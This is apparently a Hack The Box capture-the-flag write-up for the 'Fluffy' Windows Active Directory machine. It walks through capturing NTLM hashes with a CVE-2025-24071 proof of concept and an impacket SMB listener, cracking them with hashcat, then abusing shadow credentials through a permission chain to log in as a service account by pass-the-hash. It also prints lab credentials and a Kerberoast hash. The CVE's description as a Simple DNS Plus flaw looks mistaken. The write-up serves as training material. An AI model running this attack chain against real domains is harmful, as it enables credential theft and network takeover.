
# Executive Summary – HTB Fluffy

The HTB Fluffy machine is an "Easy" rated Windows Active Directory environment designed to simulate a real-world enterprise network. 

This engagement commenced with initial access via valid credentials for the user `j.fleischman`, provided in a compromised state. Subsequent enumeration and exploitation revealed vulnerabilities:

## Successful Attacks / Compromise
- **CVE-2025-24071**: Vulnerability in Simple DNS Plus allowing NTLMv2 hash extraction.
- **Shadow Credentials Misuse**: Exploiting GenericWrite permissions to escalate privileges, pivot to another account with remote management rights, and successfully log in remotely.



## Other Findings / Unsuccessful Attacks
- Listing domain users via `rpcclient enumdomusers`, revealing accounts like `Administrator`, `Guest`, `krbtgt`, service accounts (`ca_svc`, `ldap_svc`, `winrm_svc`), and user accounts (`j.coffey`, `p.agila`).  
- Gathering user information via `rpcclient queryuser j.fleischman` (password last set time, logon details, account privileges).  
- Collecting server information via `rpcclient srvinfo` (platform, OS version).  
- Kerberoasting attempted using `GetUserSPNs.py` with valid credentials. Extracted TGS hashes were tested with `Hashcat -m 13100` using wordlists (`rockyou.txt`, `johnlist`, `10k-most-common.txt`) without success.

## Key Takeaways
- Full domain compromise is possible via chained AD vulnerabilities.  
- Valid user credentials provide substantial access for enumeration.  
- Kerberoasting is a high-value attack vector, but strong service account passwords mitigate risk.  
- Detailed AD enumeration (users, groups, privileges) is critical before attempting privilege escalation.


# Detailed reproduction steps for this CVE-2025-24071 & Shadow Credentials Misuse

`sudo nmap -sC -sV 10.129.165.40`
NMAP is tool ised for port scanning, service dction and network disocver. 
- `-sC` runs nmap default scripts
- `sV` tries to identify the exact software running. 


<img src="images/nmap_scan.png" alt="nmap scan">


Next enumrate SMB share
`smbmap -H 10.129.165.40 -u "j.fleischman -p J0elTHEM4n1990!"`
 <img src="images/smbmap.png" class="report-images" alt="SMBMAP">

from this we see the user as read and write to IT share so lets connect to that share and see if there are any files on the SMB.

`smbclient //10.129.165.40/IT -U "j.fleischman"`


smb: \> ls
  .                                   D        0  Fri Sep  5 20:08:31 2025
  ..                                  D        0  Fri Sep  5 20:08:31 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 16:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 16:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 16:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 16:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 15:31:07 2025

Download UPgrade_Notice.pdf and you will see a list of vulnerbites that need patching. 
![!PDF on the SMB](images/notice.png)

To find a good example of how to run a exploit CVE- Title -github poc in google. 
You should find https://github.com/LOOKY243/CVE-2025-24071-PoC


### Steps
1. Copy the exploit.py file to your machine 
2. python3 `exploit.py -i 10.10.16.40 -s shared -f evil`
 3. Start listener for hash capture:
   `sudo impacket-smbserver shared /home/franky/Documents/FLUFFY -smb2support`
   3. Upload payload to target IT share.
      `put evil.zip`

4. You should see username + hash on listner.

5. Crack the with rockyou.txt: 
  `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`


## BloudHound 

6. Create a BloodHound file and upload to bloodhound review.
      `sudo nxc ldap dc01.fluffy.htb -u '<USERNAME>' -p '<PASSWORD>' \
      --bloodhound --collection All --dns-tcp --dns-server <TARGET_IP>`
7. `BloodHound`
8. Should see BloodHound open in new tab in firefox
9. Upload the ladp file we created to upload 
10. Search for User we enumerated
11. Examine relationships and you will see this 


![BloodHound Scan](images/Bloodhound.png)


12. If you examine WINRM_SVC in BloodHound, it is member of remote services add can remote login. If we try to use evil-winrm for user p.agila or J.FLEISCHMAN will see users don't have permisison. 

Observations form BloodHound

The user we found is in SERVICE ACCOUNT MANAGERS, which has full control (GenericAll) over SERVICE ACCOUNTS; SERVICE ACCOUNTS can modify WINRM_SVC (GenericWrite).

Implications: User can indirectly modify service accounts. Compromising this user could allow escalation to WINRM_SVC via the permission chain. WINRM_SVC can access remote login is and likely has the flag. 

## Preparations

- Start a virtual environment in your folder and install the following tools in a virtual environment:
  - `pywhisker`
  - `PKINITtools`
  - `faketime`


---

### Add User to Service Accounts

`net rpc group addmem "Service Accounts" "<USER>" \
  -U "dc01.fluffy.htb"/"<USER>" -S "<TARGET_IP>"`


### Request Kerberos TGT for Service Account

If your local time does not match the Domain Controller (DC), you may encounter AN ERROR([-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)). Synchronize time first:

`sudo rdate -n <TARGET_IP>`



`faketime <DATE_TIME> python3 gettgtpkinit.py \ -cert-pem key_cert.pem \ -key-pem key_priv.pem \ fluffy.htb/<SERVICE_ACCOUNT> \  <SERVICE_ACCOUNT>.ccache`


### Set the Kerberos ticket environment variable:

> Why we do this: 

 > When you log in with a valid ticket, it gets stored in /tmp/krb5cc_<UID>.

> All Kerberos-enabled tools (smbclient, psexec.py, ldapsearch, etc.) will look in that default location to authenticate.

> But in a pentest, you often manually extract or forge tickets (e.g., with impacket, Mimikatz, or AD CS attacks). Those tickets don’t automatically go to /tmp/krb5cc_<UID>. They’re saved in a .ccache file.

> So, to make Kerberos-aware tools use your forged/extracted ticket, you tell them where it is:

`export KRB5CCNAME=<SERVICE_ACCOUNT>.ccache`


Tip: Ensure the KRB5CCNAME export works in your virtual environment. Use an absolute path if necessary.

### Retrieve NT Hash

`faketime <DATE_TIME> python3 getnthash.py \ -key <KEY> fluffy.htb/<SERVICE_ACCOUNT>`

### Access Service Account
`evil-winrm -i <TARGET_IP> -u <SERVICE_ACCOUNT> -H <NT_HASH>`

## Additiontal findings during enumeration  
 

 rpcclient -U 'username%password' target_ip

```
  rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[ca_svc] rid:[0x44f]
user:[ldap_svc] rid:[0x450]
user:[p.agila] rid:[0x641]
user:[winrm_svc] rid:[0x643]
user:[j.coffey] rid:[0x645]
user:[j.fleischman] rid:[0x646]

rpcclient $> srvinfo
        10.129.127.23  Wk Sv PDC Tim NT     
        platform_id     :       500
        os version      :       10.0
        server type     :       0x80102b
rpcclient $> queryuser j.fleischman 
        User Name   :   j.fleischman
        Full Name   :   Joel Fleischman
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Mon, 19 May 2025 16:14:00 BST
        Logoff Time              :      Thu, 01 Jan 1970 01:00:00 BST
        Kickoff Time             :      Thu, 14 Sep 30828 03:48:05 BST
        Password last set Time   :      Fri, 16 May 2025 15:46:55 BST
        Password can change Time :      Sat, 17 May 2025 15:46:55 BST
        Password must change Time:      Thu, 14 Sep 30828 03:48:05 BST
        unknown_2[0..31]...
        user_rid :      0x646
        group_rid:      0x201
        acb_info :      0x00000210
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000001
        padding1[0..7]...
        logon_hrs[0..21]...
```



   `GetUserSPNs.py fluffy.htb/j.fleischman:J0elTHEM4n1990! -dc-ip 10.129.232.88 -request`
   
   $krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$07ec094d61c0b3c37cf1215ac10332da$771f5c1189e990a8e4c09f1ec831c6b2ae03a37202a57edf412076e68bcf73f85ecb31988aa93e370a43f8f6d36ddc6cb83ee6fb64267e8c0f7bdcbc7675c120fa8f7c17b2ee134e6e54577d8137727191871fe9d84afe1cccaed8e28aa0dfd151385feba2e034ac6d3a8f2372c6bfc2a34d353d06a575d32531b8ff18a9151e971494924493a0d63526952ef9239884ea112ad270f1b76547f9e85031881b2958c818db46f2500f0f59375ef8281454fba50df365b4f910b4a0502472143c94eda236e712346182cf486ce04c6ef1aca04828afdf212be83e135137e9dcaabd4c14c85d53446ec35e4ccbabeb2cc42b9b4d6b719cddd63d7ad2251755627e5257993f5d05fa93f40f1c248531b7b7f971ab17ffa814a9b336e02b343c0fd2f42ba311b37af01f3e25c26ef7f22a8f21fb993ab9f4e6d8dbc18cc9d37662a87d30601a820a7fbc76198701b03123fe4ca2b1f7bedb40f5fb13039834374a6db91182c5fa126e81f4ed3fe5596ad4de6b3bbade9799f22cd871e60b5384b999da087115746271a88e8b2474ada87e49374a45140b8991c02a8a1d3f36870747dfae161e9e280b0361bf914a4468898e5f787594007977252fc5d9d757c50f75b6b6af5e1558fbbcc5581bdc5bb708325430cf526345bcf11746586af9b12265e7630effdfcf9327a237eff37b3825f96068c0e29a840115145b5edf3e57fd6387b64179d101130719a936fc3d0ea9f7c5117157c2631b87d08f481e942a83c5f96450c68b641adc2fcbde83180df0ea48e3cc175defa4eee3f672b73cfee73bd1efb5fbae61fac40b973b25df27a129741945a75f429741ff7f50594d2e0d670dde7a5a9236b7d8c5d8c903ceb5e660614428f4da0d91b5756634a0f798ef3b18a60a88b2470f89ebdaa2b469049394e35fc3a18a1bd905690521d12ba48a7be5daefe4d9e040564c7c5f04a794910bd516dc6c1e4d7ff55058f4178a229fddf0fb7087f869611e430534ecd4166d9de54bbee6efbdb3de83add758ff91aa98d6a99c56ee90e71db32db4648d9f3e0d034ced0a4daf34e7169602bf41676610ac231311ec9fb0ae31166af9f90b7a3a435d2f71d732bc5e51f67a67d033f0d8def561dc4ff9a263f4d961b203bf030a8d4540ae21e4bb983e1a30d95b2c101e3e6927f38ebd959bd650c3ed98e6af7259caf383e7d350fe9a7389501e5c1e232777d42b5f15b2c3b4f369b57c440dd6b47b7783dd29edb9a4ef6bdcefce2ee2065dd7bcdf96d2ca761ca391ba5c1c4a2d85b07955efc52ae9c9b38f49216b64ffa574ebf5b691521b90657ff51dc4b3633f9324c1b4843033041e21e35bd1d6b2cf65a893efc3b8cb0910d82667db533f42b7734e7ce9087dcf888225eddf03527923257fa1483d75185a0e5a805a62ffca165a1df99f096655844c857d9b9094587cdbb703ae136981df38d27211bbdc4f1f7729980a84af9ef0a94da25a58a68202820ba81ca2afe5da53037a1a0b2f2e70f5f8ccad5721db4bfa9badf6b55d0ddbc271f355e2```

Not able to crack the hash

